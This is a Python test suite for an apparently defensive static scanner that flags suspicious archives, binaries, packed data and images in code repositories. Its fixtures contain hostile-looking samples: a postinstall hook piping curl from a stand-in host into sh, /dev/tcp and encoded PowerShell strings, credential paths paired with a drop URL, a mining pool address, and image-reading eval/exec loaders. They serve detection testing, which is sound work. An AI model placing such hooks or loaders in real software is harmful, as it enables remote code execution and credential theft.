import base64
import gzip
import io
import json
import os
import struct
import tarfile
import tempfile
import unittest
import zipfile
import zlib
from pathlib import Path
from unittest import mock

from honeyrun import artifacts
from honeyrun.static import scan


def repo(files: dict) -> Path:
    root = Path(tempfile.mkdtemp())
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(body if isinstance(body, bytes) else body.encode())
    return root


def found(files):
    return scan(repo(files))


def has(files, sev, rule):
    return any(f.severity == sev and f.rule == rule for f in found(files))


def zipped(members: dict, symlinks: dict | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for n, b in members.items():
            z.writestr(n, b)
        for n, t in (symlinks or {}).items():
            zi = zipfile.ZipInfo(n)
            zi.external_attr = (0o120777 << 16)
            z.writestr(zi, t)
    return buf.getvalue()


def tarred(members: dict, gz=True) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz" if gz else "w") as t:
        for n, b in members.items():
            ti = tarfile.TarInfo(n)
            ti.size = len(b)
            t.addfile(ti, io.BytesIO(b))
    return buf.getvalue()


def png(extra=b"", w=4, h=4):
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    raw = b"".join(b"\x00" + b"\x10\x80\xf0" * w for _ in range(h))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"") + extra)


ELF = b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 200


class Archives(unittest.TestCase):
    def test_plain_archive_is_silent(self):
        self.assertEqual(found({"data/a.zip": zipped({"a.txt": "hello\n" * 50})}), [])
        self.assertEqual(found({"data/a.tgz": tarred({"a.txt": b"hello"})}), [])

    def test_executable_members(self):
        fs = found({"a.zip": zipped({"bin/tool": ELF, "readme.txt": "x"})})
        self.assertTrue([f for f in fs if f.rule == "archive" and "executable" in f.title])
        for magic in (b"\xcf\xfa\xed\xfe", b"MZ\x90\x00"):
            name = "x.exe" if magic[:2] == b"MZ" else "x"
            self.assertTrue(has({"a.jar": zipped({name: magic + b"\x00" * 60})}, "info", "archive"))
        # a Java class is CAFEBABE: not an executable
        self.assertEqual(found({"a.jar": zipped({"A.class": b"\xca\xfe\xba\xbe" + b"\x00" * 40})}), [])

    def test_install_script_members(self):
        self.assertTrue(has({"a.whl": zipped({"setup.py": "print(1)"})}, "medium", "archive"))
        pkg = json.dumps({"scripts": {"postinstall": "node x.js"}})
        self.assertTrue(has({"a.tgz": tarred({"package/package.json": pkg.encode()})}, "medium", "archive"))
        pkg = json.dumps({"scripts": {"postinstall": "curl http://a.example.net/x | sh"}})
        self.assertTrue(has({"a.zip": zipped({"package.json": pkg})}, "high", "archive"))
        self.assertEqual(found({"a.zip": zipped({"package.json": json.dumps({"scripts": {"test": "jest"}})})}), [])

    def test_pth_traversal_and_symlinks(self):
        self.assertTrue(has({"a.whl": zipped({"evil.pth": "import os"})}, "medium", "archive"))
        self.assertTrue(has({"a.zip": zipped({"../../etc/cron.d/x": "x"})}, "medium", "archive"))
        self.assertTrue(has({"a.zip": zipped({"/abs/path": "x"})}, "medium", "archive"))
        self.assertTrue(has({"a.zip": zipped({"ok.txt": "x"}, symlinks={"l": "/etc/passwd"})}, "info", "archive"))
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as t:
            ti = tarfile.TarInfo("link")
            ti.type, ti.linkname = tarfile.SYMTYPE, "/etc/passwd"
            t.addfile(ti)
        fs = found({"a.tar": buf.getvalue()})
        self.assertTrue([f for f in fs if f.rule == "archive" and f.severity == "medium"])

    def test_nothing_is_extracted_to_disk(self):
        r = repo({"a.zip": zipped({"../escape.txt": "x", "d/f.txt": "y"})})
        before = {p for p in r.parent.rglob("*")}
        scan(r)
        self.assertEqual({p for p in r.parent.rglob("*")}, before)

    def test_zip_bomb_by_ratio(self):
        big = zipped({"zeros.bin": b"\x00" * (8 * 1024 * 1024)})
        fs = found({"bomb.zip": big})
        self.assertTrue([f for f in fs if f.severity == "medium" and "too large/suspicious" in f.title])

    def test_tgz_bomb_and_tar_traversal(self):
        bomb = tarred({"zeros": b"\x00" * (12 * 1024 * 1024)})
        self.assertTrue([f for f in found({"bomb.tgz": bomb}) if "too large/suspicious" in f.title])
        gz = gzip.compress(b"\x00" * (12 * 1024 * 1024))
        self.assertIsInstance(found({"bomb.gz": gz}), list)
        self.assertTrue(has({"t.tar": tarred({"../../x": b"data"}, gz=False)}, "medium", "archive"))

    def test_member_count_guard(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for i in range(5100):
                z.writestr(f"f{i}.txt", "")
        self.assertTrue(has({"many.zip": buf.getvalue()}, "medium", "archive"))

    def test_declared_size_guard(self):
        with mock.patch.object(artifacts, "ARCHIVE_MAX_TOTAL", 1000):
            fs = found({"a.zip": zipped({"a.txt": "x" * 3000, "b.txt": "y" * 3000})})
        self.assertTrue([f for f in fs if "too large/suspicious" in f.title])

    def test_nesting_depth(self):
        inner = zipped({"a.txt": "x"})
        for _ in range(3):
            inner = zipped({"in.zip": inner})
        self.assertTrue([f for f in found({"deep.zip": inner}) if "too large/suspicious" in f.title])
        # depth 2 is fine, and a nested archive's own findings surface
        two = zipped({"in.zip": zipped({"evil.pth": "import os"})})
        self.assertTrue(has({"two.zip": two}, "medium", "archive"))

    def test_gz_with_executable_and_7z(self):
        self.assertTrue(has({"a.gz": gzip.compress(ELF)}, "info", "archive"))
        self.assertTrue(has({"a.7z": b"7z\xbc\xaf\x27\x1c" + b"\x00" * 30}, "info", "archive"))
        self.assertEqual(found({"a.gz": gzip.compress(b"just text\n" * 20)}), [])

    def test_hooked_archive_is_at_least_medium(self):
        files = {"package.json": json.dumps({"scripts": {"postinstall": "node run.js assets/data.zip"}}),
                 "assets/data.zip": zipped({"a.txt": "fine"})}
        self.assertTrue(has(files, "medium", "archive"))
        files = {"setup.py": "import x\nx.unpack('blob.tgz')\n", "blob.tgz": tarred({"a.txt": b"fine"})}
        self.assertTrue(has(files, "medium", "archive"))
        files = {"package.json": json.dumps({"scripts": {"postinstall": "node r.js"}}), "r.js": "x", "z.7z": b"7z\xbc\xaf\x27\x1c"}
        self.assertFalse(has(files, "medium", "archive"))

    def test_corrupt_archives_never_crash(self):
        fs = found({"a.zip": b"PK\x03\x04garbage", "b.tgz": b"\x1f\x8b\x08junk", "c.tar": b"x" * 600, "d.whl": b""})
        self.assertIsInstance(fs, list)


class Binaries(unittest.TestCase):
    def strings(self, *s: str) -> bytes:
        return ELF + b"\x00".join(x.encode() for x in s) + b"\x00"

    def test_plain_binary_without_indicators_is_silent(self):
        self.assertEqual(found({"bin/tool": ELF + b"hello world, nothing\x00" * 4}), [])

    def test_indicators_are_info(self):
        b = self.strings("http://c2.example.net/beacon", "203.0.113.7", "/dev/tcp/203.0.113.7/80", "powershell -enc")
        fs = [f for f in found({"lib/x.so": b}) if f.rule == "binary-strings"]
        self.assertEqual([f.severity for f in fs], ["info"])
        self.assertIn("example.net", fs[0].detail)

    def test_allowlisted_hosts_and_private_ips_are_ignored(self):
        b = self.strings("https://github.com/org/repo", "https://registry.npmjs.org/x", "10.0.0.1", "192.168.1.5", "127.0.0.1")
        self.assertEqual(found({"lib/x.node": b}), [])

    def test_credential_paths_with_url_are_high(self):
        b = self.strings("~/.ssh/id_rsa", "https://drop.example.net/up")
        self.assertTrue(has({"lib/x.so": b}, "high", "binary-strings"))
        b = self.strings("Login Data", "https://drop.example.net/up")
        self.assertTrue(has({"x.dll": b}, "high", "binary-strings"))

    def test_base64_blob_and_miner(self):
        b = self.strings("A" * 220 + "==", "stratum+tcp://pool.example.net:3333")
        fs = [f for f in found({"x.so": b}) if f.rule == "binary-strings"]
        self.assertTrue(fs and "base64" in fs[0].detail and "stratum" in fs[0].detail)

    def test_referenced_binary_is_medium(self):
        files = {"package.json": json.dumps({"main": "lib/native.node"}), "lib/native.node": ELF + b"nothing\x00"}
        self.assertTrue(has(files, "medium", "binary-strings"))
        files = {"package.json": json.dumps({"bin": {"tool": "bin/tool"}}), "bin/tool": ELF + b"nothing here\x00"}
        self.assertTrue(has(files, "medium", "binary-strings"))

    def test_string_split_across_chunks_is_found(self):
        pad = b"\x00" * (1024 * 1024 - 10)
        b = ELF + pad[len(ELF):] + b"/dev/tcp/203.0.113.7/80\x00"
        self.assertTrue(has({"x.so": b}, "info", "binary-strings"))

    def test_limits(self):
        with mock.patch.object(artifacts, "BINARY_MAX_FILES", 2):
            fs = found({f"b{i}.so": self.strings("http://c2.example.net/x") for i in range(4)})
        self.assertTrue([f for f in fs if "not inspected" in f.title])
        with mock.patch.object(artifacts, "BINARY_MAX", 100):
            self.assertTrue([f for f in found({"x.so": ELF + b"z" * 500}) if "not inspected" in f.title])


class Entropy(unittest.TestCase):
    def test_random_blob_is_info_and_hooked_is_medium(self):
        blob = os.urandom(8192)
        self.assertTrue(has({"data/blob.bin": blob}, "info", "packed-data"))
        f = [x for x in found({"data/blob.bin": blob}) if x.rule == "packed-data"][0]
        self.assertIn("run time", f.detail)
        files = {"package.json": json.dumps({"scripts": {"postinstall": "node x.js blob.bin"}}), "x.js": "1", "blob.bin": blob}
        self.assertTrue(has(files, "medium", "packed-data"))

    def test_known_formats_small_and_text_are_silent(self):
        noise = os.urandom(8192)
        for name, magic in (("a.png", b"\x89PNG"), ("b.gz", b"\x1f\x8b"), ("c.woff2", b"wOF2"), ("d.pdf", b"%PDF"),
                            ("e.mp4", b"\x00\x00\x00\x18ftypmp42"), ("f.webp", b"RIFF\x00\x00\x00\x00WEBPVP8 ")):
            self.assertFalse([f for f in found({name: magic + noise}) if f.rule == "packed-data"], name)
        self.assertEqual(found({"small.bin": os.urandom(2000)}), [])
        self.assertEqual(found({"notes.txt": "plain words " * 1000}), [])

    def test_entropy_function(self):
        self.assertAlmostEqual(artifacts.entropy(b"\x00" * 100), 0.0)
        self.assertGreater(artifacts.entropy(bytes(range(256)) * 16), 7.99)


class Images(unittest.TestCase):
    def test_clean_images_are_silent(self):
        self.assertEqual(found({"a.png": png()}), [])
        self.assertEqual(found({"a.png": png(b"\n")}), [])

    def test_png_appended_payload_with_decoded_excerpt(self):
        pay = base64.b64encode(b"fetch http://c2.example.net/stage2 and run it please")
        fs = [f for f in found({"logo.png": png(pay)}) if f.rule == "image-payload"]
        self.assertEqual(fs[0].severity, "medium")
        self.assertIn("c2.example.net", fs[0].detail)
        self.assertIn(str(len(pay)), fs[0].detail)

    def test_jpeg_and_gif_trailers(self):
        jpg = b"\xff\xd8\xff\xe0" + b"\x00" * 50 + b"\xff\xd9"
        self.assertEqual(found({"a.jpg": jpg}), [])
        self.assertTrue(has({"a.jpg": jpg + b"MZ-payload " * 20}, "medium", "image-payload"))
        gif = b"GIF89a\x01\x00\x01\x00\x00\x00\x00" + b"\x2c" + b"\x00" * 8 + b"\x00" + b"\x02\x01\x44\x00" + b"\x3b"
        self.assertEqual(found({"a.gif": gif}), [])
        self.assertTrue(has({"a.gif": gif + b"secret-tail" * 20}, "medium", "image-payload"))

    def test_small_tail_is_tolerated(self):
        self.assertEqual(found({"a.png": png(b"x" * 64)}), [])
        self.assertTrue(has({"a.png": png(b"x" * 65)}, "medium", "image-payload"))

    def test_svg(self):
        self.assertTrue(has({"a.svg": "<svg><script>alert(1)</script></svg>"}, "medium", "image-payload"))
        self.assertTrue(has({"a.svg": '<svg><rect onload="x()"/></svg>'}, "medium", "image-payload"))
        self.assertTrue(has({"a.svg": '<svg><a href="javascript:x()"><rect/></a></svg>'}, "medium", "image-payload"))
        self.assertEqual(found({"a.svg": '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/><text>onion = 1</text></svg>'}), [])

    def test_steganography_loader_is_high(self):
        js = "const fs=require('fs');const d=fs.readFileSync(__dirname+'/assets/logo.png');eval(d.slice(100).toString());"
        self.assertTrue(has({"loader.js": js, "assets/logo.png": png()}, "high", "image-loader"))
        py = "d = open('logo.png','rb').read()\nexec(d[100:])\n"
        self.assertTrue(has({"app.py": py, "logo.png": png()}, "high", "image-loader"))

    def test_loader_needs_all_three_parts(self):
        js = "const fs=require('fs');const d=fs.readFileSync(__dirname+'/logo.png');send(d);"
        self.assertFalse(has({"a.js": js, "logo.png": png()}, "high", "image-loader"))
        self.assertFalse(has({"a.js": "eval(x);const i='logo.png'; fs.readFileSync(y)"}, "high", "image-loader"))


class Budget(unittest.TestCase):
    def test_budget_exhaustion_is_reported_once(self):
        with mock.patch.object(artifacts, "TOTAL_BUDGET", 5000):
            fs = found({f"d/{i}.so": ELF + b"z" * 3000 for i in range(4)})
        inc = [f for f in fs if f.rule == "scan-incomplete" and "artifact scan incomplete" in f.title]
        self.assertEqual(len(inc), 1)
        self.assertEqual(inc[0].severity, "medium")

    def test_normal_scans_do_not_report_incomplete(self):
        self.assertFalse([f for f in found({"a.png": png(), "b.zip": zipped({"a": "b"})}) if f.rule == "scan-incomplete"])


if __name__ == "__main__":
    unittest.main()
